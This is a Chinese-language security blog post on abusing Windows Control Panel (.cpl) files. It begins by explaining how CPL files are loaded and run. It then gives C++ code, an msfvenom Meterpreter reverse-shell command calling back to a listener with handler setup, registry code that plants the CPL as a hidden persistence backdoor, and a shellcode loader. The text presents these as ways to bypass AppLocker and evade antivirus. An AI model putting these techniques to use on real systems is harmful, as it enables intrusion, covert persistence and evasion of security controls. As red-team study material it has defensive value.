前言
--

最近无意间发现了cpl文件,之前对该类型的文件了解几乎为零,由于触及到我的知识盲区,于是决定探究。

cpl文件
-----

CPL文件，是Windows控制面板扩展项，CPL全拼为`Control Panel Item`  
在system32目录下有一系列的cpl文件,分别对应着各种控制面板的子选项  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-20be0f30a7a196425943caefc02a2c41821fb844.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-20be0f30a7a196425943caefc02a2c41821fb844.png)

列入我们`win+R`输入`main.cpl`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ade36a57c41a039a195f4361ca4bb0bf9ee28849.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ade36a57c41a039a195f4361ca4bb0bf9ee28849.png)

将会打开控制面板中的鼠标属性  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0ef678ce3e51853390aa575179232e28fbdfca68.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0ef678ce3e51853390aa575179232e28fbdfca68.png)

cpl文件本质是属于PE文件  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1b45da1715fc3a32bf16b38702db937560b33ed5.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1b45da1715fc3a32bf16b38702db937560b33ed5.png)

但cpl并不像exe,更像是dll,无法直接打开,只能以加载的形式运行。  
并且有一个导出函数`CPlApplet`  
该函数是控制面板应用程序的入口点，它被控制面板管理程序自动调用，且是个回调函数。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-181ac96ed880274877032e38a44c912d6f510042.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-181ac96ed880274877032e38a44c912d6f510042.png)

如何打开cpl
-------

1.双击或者win+r xxx.cpl  
2.control &lt;文件名&gt;  
3.rundll32 shell32.dll,Control\_RunDLL &lt;文件名&gt;  
注意：所有rundll32 shell32.dll,Control\_RunDLL的命令均可用control替代，control.exe实质调用了rundll32.exe。打开后找不到control.exe进程，只能找到rundll32.exe。

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a7a4e1ba52f3677f12fe8c668ffa9d070cd600af.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a7a4e1ba52f3677f12fe8c668ffa9d070cd600af.png)

4.vbs脚本

```vbs
Dim obj
Set obj = CreateObject("Shell.Application")
obj.ControlPanelItem("C:\Users\11793\Desktop\cpl.cpl")
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5d039f0bb77623816cb94b351474028f34c8262a.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5d039f0bb77623816cb94b351474028f34c8262a.png)

5.js脚本

```javascript
var a = new ActiveXObject("Shell.Application");
a.ControlPanelItem("C:\\Users\\11793\\Desktop\\cpl.cpl");
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5773bf2015dae378df990802f1d297397e566568.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5773bf2015dae378df990802f1d297397e566568.png)

如何自己制造一个cpl文件
-------------

最简单的方式:直接创建一个dll,无需导出函数,然后改后缀名

```c++
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        WinExec("Calc.exe", SW_SHOW);
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

随便一种方式执行  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a22fa4542341d6c274e0676d2d556893570a627d.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a22fa4542341d6c274e0676d2d556893570a627d.png)

这里既然可以弹出calc.exe,那么能不能执行自己的payload的呢,答案是肯定的。

cpl文件的应用
--------

### bypass Windows AppLocker

什么是`Windows AppLocker`:  
AppLocker即“应用程序控制策略”，是Windows 7系统中新增加的一项安全功能。在win7以上的系统中默认都集成了该功能。

默认的Applocker规则集合,可以看到cpl并不在默认规则中:  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-9c660af9de7e97aba3eb1e94e1fd45cc12a79cdf.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-9c660af9de7e97aba3eb1e94e1fd45cc12a79cdf.png)

开启Applocker规则:  
打开计算机管理,选择服务,将`Application Identity`服务开启  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-af2c25a242c89a0136f46d7fa8696582ccc8aacb.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-af2c25a242c89a0136f46d7fa8696582ccc8aacb.png)

然后在安全策略中,添加一条applocker规则,会询问是否添加默认规则  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-77c741bf5935e30ce958c0d9d7e8cd939cb6edac.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-77c741bf5935e30ce958c0d9d7e8cd939cb6edac.png)

默认规则为:  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-552eff92f1f8cc8da10ed41565b47aaa7d8e2555.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-552eff92f1f8cc8da10ed41565b47aaa7d8e2555.png)

假设设置某一路径无法执行可执行程序,再次运行时就会提示组策略安全,不允许运行  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b46009011f48b1844c222cbdbea62bec74d02dad.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b46009011f48b1844c222cbdbea62bec74d02dad.png)

绕过的方式有很多,这里只讲cpl文件  
完全可以把代码写入到cpl文件中,同样达到执行目的,这里就弹一个cmd  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a6de116082face145b4c6148b2ee665fd7365991.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a6de116082face145b4c6148b2ee665fd7365991.png)

### msf直接生成cpl文件

生成cpl文件  
`msfvenom -p windows/meterpreter/reverse_tcp -b '\x00\xff' lhost=192.168.111.128 lport=8877 -f dll -o cpl.cpl`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8606afda64abebfe2a2524f2ab193e10622046d1.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8606afda64abebfe2a2524f2ab193e10622046d1.png)

将文件拖到本地并运行,msf监听

- use exploit/multi/handler
- set payload windows/meterpreter/reverse\_tcp
- set lhost 192.168.111.128
- set lport 8877
- exploit

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-9da2b350c1e60c3977d952330320361b84eaef2a.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-9da2b350c1e60c3977d952330320361b84eaef2a.png)  
这样肯定是不够的,可以把这个cpl文件当作一个后门,做到一个权限维持的效果,且比较隐蔽。  
将cpl文件名称改为`test.cpl`  
创建一个项目,作用为修改注册表:

```c++
HKEY hKey;
DWORD dwDisposition;
char path[] = "C:\\test.cpl";
RegCreateKeyExA(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\Cpls", 0, NULL, 0, KEY_WRITE, NULL, &hKey, &dwDisposition);
RegSetValueExA(hKey, "test.cpl", 0, REG_SZ, (BYTE*)path, (1 + ::lstrlenA(path)));
```

不一定将cpl文件放到c盘更目录,可以自定义路径  
执行后  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0d5385a7b9c0f024fdae6111c5ebb2bf363b0c2a.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0d5385a7b9c0f024fdae6111c5ebb2bf363b0c2a.png)  
然后这里在开启control.exe时,test.cpl文件也会被打开。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b6a542c7867a227c4c0da708c575190cf19826e4.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b6a542c7867a227c4c0da708c575190cf19826e4.png)

如果目标主机有杀软,可以通过该方法白加黑绕过,但是msf的cpl文件特征非常明显,静态太概率都会被杀掉。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-9250d6e8bcd73708c91b983a81497ba6523a0312.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-9250d6e8bcd73708c91b983a81497ba6523a0312.png)  
除了加壳之外,寄希望于自己实现加载shellcode,方便做混淆。

### 使用shellcode自己做一个cpl文件

直接上代码

```c++
#include "pch.h"
#include "windows.h"

extern "C" __declspec(dllexport) VOID CPlApplet(HWND hwndCPl, UINT msg, LPARAM lParam1, LPARAM lParam2)
{
    MessageBoxA(0, NULL, "test", MB_OK);
    /* length: 835 bytes */
    unsigned char buf[] = "shellcode";
    LPVOID Memory = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(Memory, buf, sizeof(buf));
    ((void(*)())Memory)();
}
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

这是最最最最基础的loader  
先打开`control.exe`看看效果  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-59df54101aa229049c02a61da5310e0e8ddde4d2.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-59df54101aa229049c02a61da5310e0e8ddde4d2.png)

看看查杀率

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0726dbf02dfedea73d40d2615e0736efef838075.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0726dbf02dfedea73d40d2615e0736efef838075.png)  
这里上传的文本,shellcode没有做任何的处理,查杀率已经算比较低的,如果混淆一下,很轻松的就可以静态过杀软,再用白加黑,是不是想想就很轻松呢。

经过一系列处理后,找杀毒能力还比较强的360试一下  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e30d66ea8a8d7789076adb8a0a247c04613e4d86.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e30d66ea8a8d7789076adb8a0a247c04613e4d86.png)

参考
--

<https://wooyun.js.org/drops/CPL%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8%E4%BB%8B%E7%BB%8D.html>

<https://attack.mitre.org/techniques/T1218/002/>

<https://docs.microsoft.com/zh-cn/windows/security/threat-protection/windows-defender-application-control/applocker/working-with-applocker-rules>